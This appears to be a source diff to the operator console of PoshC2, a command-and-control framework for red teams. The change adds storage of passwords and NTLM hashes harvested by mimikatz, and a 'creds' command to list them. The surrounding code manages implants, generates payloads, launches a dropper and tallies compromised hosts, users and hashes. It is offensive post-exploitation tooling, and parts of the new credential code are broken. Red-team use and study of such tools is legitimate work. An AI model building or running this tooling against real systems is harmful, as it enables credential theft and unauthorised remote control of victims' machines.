@@ -4,7 +4,7 @@ import sys, re, os, time, subprocess, traceback, signal, argparse, readline
 from sqlite3 import Error
 from Help import logopic, PRECOMMANDS, UXCOMMANDS, SHARPCOMMANDS, COMMANDS, pre_help
 from DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails
-from DB import get_newimplanturl, get_implantbyid, new_task, get_implants, get_history_dict, get_lastcommand
+from DB import get_newimplanturl, get_implantbyid, new_task, get_implants, get_history_dict, get_lastcommand, get_allcreds, insert_cred
 from DB import new_commandhistory, get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
 from DB import  drop_newtasks, get_implanttype, update_label, update_sleep, get_history, kill_implant, unhide_implant
 from DB import get_pid, get_allurls, get_sharpurls, get_randomuri, get_hostdetails, select_item
@@ -17,6 +17,7 @@ from Utils import validate_sleep_time, randomuri
 from PyHandler import handle_py_command
 from SharpHandler import handle_sharp_command
 from PSHandler import handle_ps_command
+from tabulate import tabulate
 
 if os.name == 'nt':
   import pyreadline.rlmain
@@ -58,6 +59,10 @@ def process_mimikatzout(current):
             current[f] = ''
 
     if current['Username'] != '' and (current['Password'] != '' or current['NTLM'] != ''):
+        if current['Password']:
+          insert_cred(current['Username'], current['Password'], False)
+        if current['NTLM']:
+          insert_cred(current['Username'], current['NTLM'], True)
         return current['Username'], current['Password'], current['NTLM']
 
 def createproxypayload(user, startup):
@@ -239,11 +244,13 @@ def startup(user, printhelp = ""):
           new_commandhistory(implant_id)
       except Exception as e:
         pass
+    
+    implant_id = implant_id.lower().strip()
         
-    if (implant_id == "") or (implant_id.lower() == "back") or (implant_id.lower() == "clear"):
+    if (implant_id == "") or (implant_id == "back") or (implant_id == "clear"):
       startup(user)
 
-    if "output-to-html" in implant_id.lower():
+    if "output-to-html" in implant_id:
       generate_table("Tasks")
       generate_table("C2Server")
       generate_table("Creds")
@@ -251,51 +258,51 @@ def startup(user, printhelp = ""):
       graphviz()
       time.sleep(1)
       startup(user)
-    if ("show-urls" in implant_id.lower()) or ("list-urls" in implant_id.lower()):
+    if ("show-urls" in implant_id) or ("list-urls" in implant_id):
       urls = get_c2urls()
       urlformatted = "RandomID  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
       for i in urls:
         urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0],i[1],i[2],i[3],i[4],i[5],i[6],i[7])
       startup(user, urlformatted)
-    if "add-autorun" in implant_id.lower():
-      autorun = (implant_id.lower()).replace("add-autorun ","")
+    if "add-autorun" in implant_id:
+      autorun = (implant_id).replace("add-autorun ","")
       autorun = autorun.replace("add-autorun","")
       add_autorun(autorun)
       startup(user, "add-autorun: %s\r\n" % autorun)
-    if "list-autorun" in implant_id.lower():
+    if "list-autorun" in implant_id:
       autoruns = get_autorun()
       startup(user, autoruns)
-    if "del-autorun" in implant_id.lower():
-      autorun = (implant_id.lower()).replace("del-autorun ","")
+    if "del-autorun" in implant_id:
+      autorun = (implant_id).replace("del-autorun ","")
       del_autorun(autorun)
       startup(user, "deleted autorun\r\n")
-    if "nuke-autorun" in implant_id.lower():
+    if "nuke-autorun" in implant_id:
       del_autoruns()
       startup(user, "nuked autoruns\r\n")
-    if (implant_id.lower() == "automigrate-frompowershell") or (implant_id.lower() == "am"):
+    if (implant_id == "automigrate-frompowershell") or (implant_id == "am"):
       startup(user, "automigrate not currently implemented for the Python version of PoshC2\r\n")
-    if "show-serverinfo" in implant_id.lower():
+    if "show-serverinfo" in implant_id:
       i = get_c2server_all()
       detailsformatted = "\nHostnameIP: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nHTTPResponse: %s\nFolderPath: %s\nServerPort: %s\nQuickCommand: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nEnableSounds: %s\nAPIKEY: %s\nMobileNumber: %s\nURLS: %s\n%sSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nAPIToken: %s\nAPIUser: %s\nEnableNotifications: %s" % (i[1],i[2],i[3],i[4],i[5],i[6],i[7],i[8],i[9],i[10],i[11],i[12],i[13],i[14],i[15],i[16],i[17],i[18],i[19],i[20],i[21],i[22],i[23],i[24])
       startup(user, detailsformatted)
-    if "turnoff-notifications" in implant_id.lower():
+    if "turnoff-notifications" in implant_id:
       update_item("EnableNotifications", "C2Server", "No")
       startup(user, "Turned off notifications on new implant")
-    if "turnon-notifications" in implant_id.lower():
+    if "turnon-notifications" in implant_id:
       update_item("EnableNotifications", "C2Server", "Yes")
       startup(user, "Turned on notifications on new implant")
-    if "set-clockworksmsapikey" in implant_id.lower():
-      cmd = (implant_id.lower()).replace("set-clockworksmsapikey ","")
+    if "set-clockworksmsapikey" in implant_id:
+      cmd = (implant_id).replace("set-clockworksmsapikey ","")
       cmd = cmd.replace("set-clockworksmsapikey","")
       update_item("MobileNumber", "C2Server", cmd)
       startup(user, "Updated set-clockworksmsapikey: %s\r\n" % cmd)
-    if "set-clockworksmsnumber" in implant_id.lower():
-      cmd = (implant_id.lower()).replace("set-clockworksmsnumber ","")
+    if "set-clockworksmsnumber" in implant_id:
+      cmd = (implant_id).replace("set-clockworksmsnumber ","")
       cmd = cmd.replace("set-clockworksmsnumber","")
       update_item("APIKEY", "C2Server", cmd)
       startup(user, "Updated set-clockworksmsnumber (Restart C2 Server): %s\r\n" % cmd)
-    if "set-defaultbeacon" in implant_id.lower():
-      new_sleep = (implant_id.lower()).replace("set-defaultbeacon ","")
+    if "set-defaultbeacon" in implant_id:
+      new_sleep = (implant_id).replace("set-defaultbeacon ","")
       new_sleep = new_sleep.replace("set-defaultbeacon","")
       if not validate_sleep_time(new_sleep):
         print(Colours.RED)
@@ -306,7 +313,7 @@ def startup(user, printhelp = ""):
         update_item("DefaultSleep", "C2Server", new_sleep)
         startup(user, "Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % new_sleep)
       
-    if "opsec" in implant_id.lower():
+    if "opsec" in implant_id:
       implants = get_implants_all()
       comtasks = get_tasks()
       hosts = ""
@@ -339,27 +346,47 @@ def startup(user, printhelp = ""):
           filehash = uploadedfile.partition(" with md5sum:")[2].strip()
           uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
           uploadedfile = uploadedfile.strip('"')
-          uploads += "%s\t%s\t%s\n" % (hostname[3], filehash, uploadedfile)
+          uploads += "%s\t\t%s\t\t%s\n" % (hostname[3], filehash, uploadedfile)
         if "installing persistence" in t[4].lower():
           hostname = get_implantdetails(t[2])
           line = t[4].replace('\n','')
           line = line.replace('\r','')
           filenameuploaded = line.rstrip().split(":",1)[1]
-          uploads += "%s %s \n" % (hostname[3], filenameuploaded)
+          uploads += "%s\t\t%s\t\t%s\n" % (hostname[3], filehash, filenameuploaded)
       startup(user, "Users Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (users, hosts, urls, uploads, creds, hashes))
-    if "listmodules" in implant_id.lower():
+    if "listmodules" in implant_id:
       mods = ""
       for modname in os.listdir("%s/Modules/" % POSHDIR):
         mods += "%s\r\n" % modname
       startup(user, mods)
-    if "creds" in implant_id.lower():
-      startup(user, "creds module not implemented yet")
+    if "creds" in implant_id:
+      if "creds" == implant_id: 
+        all_creds = get_allcreds()
+        creds_print = []
+        for cred in all_creds:
+          is_hash = "Y"
+          if cred['Is_Hash'] == '0':
+            is_hash = "N"
+          creds_print.append([cred['Username'], cred['Password'], is_hash])
+        print tabulate([["Username", "Password", "Is Hash"]].append(creds_print), tablefmt="pipe")
+        startup(user, tabulate([["Username", "Password", "Is Hash"]].append(creds_print), tablefmt="pipe"))
+    
+      if implant_id.startswith("creds -action add"):
+        args = implant_id.replace("creds -action add", "").strip().split()
+        username = None
+        password = None
+        is_hash  = None
+        #TODO
+        if username is None or password is None or is_hash is None:
+          startup("Missing argument - format is: creds -action <dump/add/del/search> -username <username> -password/-hash <password/hash>")
+        insert_cred(username, password, is_hash)
+        startup(user, "Credential added")
 
-    if (implant_id.lower() == "pwnself") or (implant_id.lower() == "p"):
+    if (implant_id == "pwnself") or (implant_id == "p"):
       subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
       startup(user)
 
-    if (implant_id.lower() == "tasks") or (implant_id.lower() == "tasks "):
+    if (implant_id == "tasks"):
       alltasks = ""
       tasks = get_newtasks_all()
       if tasks is None:
@@ -370,11 +397,11 @@ def startup(user, printhelp = ""):
           alltasks += "(%s) %s\r\n" % ("%s\\%s" % (imname[11],imname[2]),task[2])
         startup(user, "Queued tasks:\r\n\r\n%s" % alltasks)
 
-    if (implant_id.lower() == "cleartasks") or (implant_id.lower() == "cleartasks "):
+    if (implant_id == "cleartasks"):
       drop_newtasks()
       startup(user, "Empty tasks queue\r\n")
 
-    if "quit" in implant_id.lower():
+    if "quit" in implant_id:
       ri = raw_input("Are you sure you want to quit? (Y/n) ")
       if ri.lower() == "n":
         startup(user)
@@ -383,22 +410,22 @@ def startup(user, printhelp = ""):
       if ri.lower() == "y":
         sys.exit(0)
     
-    if "createdaisypayload" in implant_id.lower():
+    if "createdaisypayload" in implant_id:
       createdaisypayload(user, startup)
 
-    if "createproxypayload" in implant_id.lower():
+    if "createproxypayload" in implant_id:
       createproxypayload(user, startup)
 
-    if "createnewpayload" in implant_id.lower():
+    if "createnewpayload" in implant_id:
       createnewpayload(user, startup)
 
     if (implant_id == "?") or (implant_id == "help"):
       startup(user, pre_help)
     
-    if (implant_id.lower() == "history") or implant_id.lower() == "history ":
+    if (implant_id == "history") or implant_id == "history ":
       startup(user, get_history())
 
-    if "use " in implant_id.lower():
+    if "use " in implant_id:
       implant_id = implant_id.replace("use ","")
       params = re.compile("use ", re.IGNORECASE)
       implant_id = params.sub("", implant_id)
@@ -423,7 +450,7 @@ def runcommand(command, randomuri):
           new_commandhistory(command)
       else:
         new_commandhistory(command)
-    except Exception as e:
+    except Exception:
       pass
 
   implant_type = get_implanttype(randomuri)
@@ -446,7 +473,7 @@ def commandloop(implant_id, user):
       readline.set_completer_delims('\t')
       readline.parse_and_bind("tab: complete")
       readline.set_completer(t.listCompleter)
-      if ("-" in implant_id.lower()) or ("all" in implant_id.lower()) or ("," in implant_id.lower()):
+      if ("-" in implant_id) or ("all" in implant_id) or ("," in implant_id):
         print (Colours.GREEN)
         command = raw_input("%s> " % (implant_id))
       else:
@@ -466,7 +493,7 @@ def commandloop(implant_id, user):
         command = raw_input("%s> " % (implant_id))
 
       # if "all" run through all implants get_implants()
-      if implant_id.lower() == "all":
+      if implant_id == "all":
         if command == "back":
           startup(user)
         implant_split = get_implants()
@@ -486,7 +513,7 @@ def commandloop(implant_id, user):
           try:
             implant_id = get_randomuri(implant_id)
             runcommand(command, implant_id)
-          except Exception as e:
+          except Exception: 
             print ("Unknown ImplantID")
       # else run against single uri
       else:
